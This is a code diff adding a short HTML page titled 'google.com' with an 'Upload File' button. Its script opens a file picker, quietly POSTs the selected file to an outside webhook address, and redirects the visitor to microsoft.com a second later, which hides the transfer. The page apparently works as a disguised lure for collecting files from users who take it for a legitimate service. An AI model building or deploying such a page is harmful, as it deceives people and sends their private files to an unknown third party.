@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>google.com</title>
+</head>
+<body>
+
+<button id="uploadButton">Upload File</button>
+<input type="file" id="fileInput" style="display: none;" />
+
+<script>
+  const webhookURL = "https://keen-sun-82.webhook.cool";
+
+  document.getElementById("uploadButton").addEventListener("click", function () {
+    const fileInput = document.getElementById("fileInput");
+    fileInput.click();
+
+
+    setTimeout(() => {
+      location.href = "https://microsoft.com/";
+    }, 1000);
+  });
+
+
+  document.getElementById("fileInput").addEventListener("change", async function (event) {
+    const file = event.target.files[0];
+    if (!file) return;
+
+    const formData = new FormData();
+    formData.append("file", file);
+
+    try {
+      await fetch(webhookURL, {
+        method: "POST",
+        body: formData
+      });
+      console.log("File berhasil dikirim ke webhook");
+    } catch (err) {
+      console.error("Gagal mengirim file:", err);
+    }
+  });
+</script>
+
+</body>
+</html>
